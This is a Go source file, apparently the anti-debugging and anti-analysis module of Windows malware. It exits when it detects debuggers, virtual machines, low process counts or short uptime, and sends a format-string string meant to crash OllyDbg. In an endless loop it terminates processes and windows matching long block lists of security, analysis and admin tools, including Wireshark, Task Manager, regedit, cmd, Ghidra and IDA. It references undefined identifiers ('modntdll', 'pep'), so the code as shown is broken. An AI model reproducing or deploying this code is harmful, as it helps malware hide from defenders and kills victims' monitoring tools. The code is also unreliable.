package antidebug

import (
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"
	"unsafe"
	"path/filepath"
	"golang.org/x/sys/windows"
	"github.com/shirou/gopsutil/v3/process"
)

var (
	// user 32 related
	user32DLL       = syscall.NewLazyDLL("user32.dll")
	enumWindowsProc = user32DLL.NewProc("EnumWindows")
	getWindowText   = user32DLL.NewProc("GetWindowTextA")
	getWindowThread = user32DLL.NewProc("GetWindowThreadProcessId")
        //kernel 32 related
	kernel32DLL          = syscall.NewLazyDLL("kernel32.dll")
	isDebugger           = kernel32DLL.NewProc("IsDebuggerPresent")
	debugString          = kernel32DLL.NewProc("OutputDebugStringA")
	procOpenProcess      = kernel32DLL.NewProc("OpenProcess")
	procTerminateProcess = kernel32DLL.NewProc("TerminateProcess")
	tickcount = syscall.NewLazyDLL("kernel32.dll").NewProc("GetTickCount") // kernel32DLL.NewProc("GetTickCount")
	crdp  = kernel32DLL.NewProc("CheckRemoteDebuggerPresent")

	// ntdll related
	ntdll               = syscall.NewLazyDLL("ntdll.dll")
	ntquery = ntdll.NewProc("NtQueryInformationProcess")
	ntclose              = modntdll.NewProc("NtClose")
	createmutex          = syscall.NewLazyDLL("kernel32.dll").NewProc("CreateMutexA")
	handleinfo = syscall.NewLazyDLL("kernel32.dll").NewProc("SetHandleInformation")

	flagfromclose = uint32(0x00000002)
)

type ProcessInfo struct {
	Res1                   uintptr
	PebAddr                uintptr
	Res2                   [2]uintptr
	PID                    uintptr
	InheritedFromPID       uintptr
}

func NtQueryProc(handle syscall.Handle, class uint32, info *ProcessInfo, length uint32) {
	syscall.Syscall6(ntquery.Addr(), 5, uintptr(handle), uintptr(class), uintptr(unsafe.Pointer(info)), uintptr(length), 0, 0)
}

func QueryImageName(handle syscall.Handle, flags uint32, nameBuffer []uint16, size *uint32) {
	windows.QueryFullProcessImageName(windows.Handle(handle), flags, &nameBuffer[0], size)
}

func CurrentProcName() string {
	exe123, _ := os.Executable()
	return filepath.Base(exe123)
}

func terminateProcess(pid uint32) error {
	handle, _, _ := procOpenProcess.Call(syscall.PROCESS_TERMINATE, 0, uintptr(pid))
	if handle == 0 {
		return fmt.Errorf("failed to open process")
	}
	defer syscall.CloseHandle(syscall.Handle(handle))

	ret, _, _ := procTerminateProcess.Call(handle, 0)
	if ret == 0 {
		return fmt.Errorf("failed to terminate process")
	}
	return nil
}

func KillProcessesByNames(blacklist []string) error {
	processes, _ := process.Processes()

	for _, p := range processes {
		processName, _ := p.Name()

		if contains(blacklist, processName) {
			terminateProcess(uint32(p.Pid))
		}
	}

	return nil
}

func getCallback(blacklist []string) uintptr {
	return syscall.NewCallback(func(hwnd syscall.Handle, lparam uintptr) uintptr {
		var title [256]byte

		getWindowText.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&title)), uintptr(len(title)))

		titleStr := string(title[:])

		if titleStr == "" {
			return 1
		}

		if contains(blacklist, titleStr) {
			var pid uint32
			getWindowThread.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&pid)))

			terminateProcess(pid)

		}
		return 1
	})
}

func KillProcessesByWindowsNames(callback uintptr) error {
	enumWindowsProc.Call(callback, 0)
	return nil
}

func IsDebuggerPresent() bool {
	flag, _, _ := isDebugger.Call()
	return flag != 0
}

func outputDebugString(message string) {
	debugString.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))))
}

func OutputDebugStringAntiDebug() {
	outputDebugString("hm")
}

func OutputDebugStringOllyDbgExploit() {
	outputDebugString("%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s")
}

func contains(slice []string, processName string) bool {
	processName = strings.ToLower(processName)

	for _, s := range slice {
		if strings.Contains(processName, s) {
			return true
		}
	}

	return false
}

func ParentAntiDebug() {
	const ProcInfo = 0
	var p ProcessInfo
	NtQueryProc(syscall.Handle(windows.CurrentProcess()), ProcInfo, &p, uint32(unsafe.Sizeof(p)))
	par := int32(p.InheritedFromPID)
	if par == 0 {
		return
	}
	handle, _ := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, false, uint32(par))
	defer syscall.CloseHandle(handle)
	buff13 := make([]uint16, windows.MAX_PATH)
	size := uint32(len(buff13))
	QueryImageName(handle, 0, buff13, &size)
	pa1231 := syscall.UTF16ToString(buff13[:size])
	parname := filepath.Base(pa1231)
	if parname != "explorer.exe" && parname != "cmd.exe" {
		os.Exit(-1)
	}
}
// running processes check
func rpc() int {
	var ids [1024]uint32
	var needed uint32
	pep.Call(uintptr(unsafe.Pointer(&ids)), uintptr(len(ids)), uintptr(unsafe.Pointer(&needed)))
	return int(needed / 4)
}

func NtCloseAntiDebug_InvalidHandle() bool {
	r1, _, _ := ntclose.Call(uintptr(0x1231222))
	return r1 != 0
}

func NtCloseAntiDebug_ProtectedHandle() bool {
	r1, _, _ := createmutex.Call(0, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(fmt.Sprintf("%d", 1234567)))))
	hMutex := uintptr(r1)
	r1, _, _ = handleinfo.Call(hMutex, uintptr(flagfromclose), uintptr(flagfromclose))
	if r1 == 0 {
		return false
	}
	r1, _, _ = ntclose.Call(hMutex)
	return r1 != 0
}

func Run() {
	if runtime.GOOS != "windows" {
	fmt.Println("lol gtfo.")  // why would someone try to run on other machine than windows lol???
	return // os.Exit(-1)
	}
	if IsDebuggerPresent() {
		os.Exit(0)
	}
	// remote debugger is presesnt
	var isremdebpres bool
	crdp.Call(^uintptr(0), uintptr(unsafe.Pointer(&isremdebpres)))
	if isremdebpres {
	fmt.Println("xd remote debug is detected")
	os.Exit(-1)
	}
	// Check Processes (Workstations have most of the time less than 50 / 70 )
	count := rpc()
	if count < 50 { 
	return
	}
	// pc uptime check
	heh, _, _ := tickcount.Call()
	if heh/1000 < 1200 {
	os.Exit(-1)
	}
	NtCloseAntiDebug_InvalidHandle()
	NtCloseAntiDebug_ProtectedHandle()
	ParentAntiDebug() // most processes while being debugged have other parent than explorer / cmd lol (x64/ binaryninja as example)
	
	blacklist := []string{
		"ksdumperclient", "regedit", "ida64", "vmtoolsd", "vgauthservice",
		"wireshark", "x32dbg", "ollydbg", "vboxtray", "df5serv", "vmsrvc",
		"vmusrvc", "taskmgr", "vmwaretray", "xenservice", "pestudio", "vmwareservice",
		"qemu-ga", "prl_cc", "prl_tools", "cmd",
		"joeboxcontrol", "vmacthlp", "httpdebuggerui", "processhacker",
		"joeboxserver", "fakenet", "ksdumper", "vmwareuser", "fiddler",
		"x96dbg", "dumpcap", "vboxservice",
	}

	callback := getCallback([]string{
		"simpleassemblyexplorer", "dojandqwklndoqwd", "procmon64", "process hacker",
		"sharpod", "http debugger", "dbgclr", "x32dbg", "sniffer", "petools",
		"simpleassembly", "ksdumper", "dnspy", "x96dbg", "de4dot", "exeinfope",
		"windbg", "mdb", "harmony", "systemexplorerservice", "megadumper",
		"system explorer", "mdbg", "kdb", "charles", "stringdecryptor", "phantom",
		"debugger", "extremedumper", "pc-ret", "folderchangesview", "james",
		"process monitor", "protection_id", "de4dotmodded", "x32_dbg", "pizza", "fiddler",
		"x64_dbg", "httpanalyzer", "strongod", "wireshark", "gdb", "graywolf", "x64dbg",
		"ksdumper v1.1 - by equifox", "wpe pro", "ilspy", "dbx", "ollydbg", "x64netdumper",
		"scyllahide", "kgdb", "systemexplorer", "proxifier", "debug", "httpdebug",
		"httpdebugger", "0harmony", "mitmproxy", "ida -",
		"codecracker", "ghidra", "titanhide", "hxd", "reversal",
	})

	for {
		OutputDebugStringAntiDebug()
		OutputDebugStringOllyDbgExploit()

		KillProcessesByNames(blacklist)
		KillProcessesByWindowsNames(callback)
	}
}
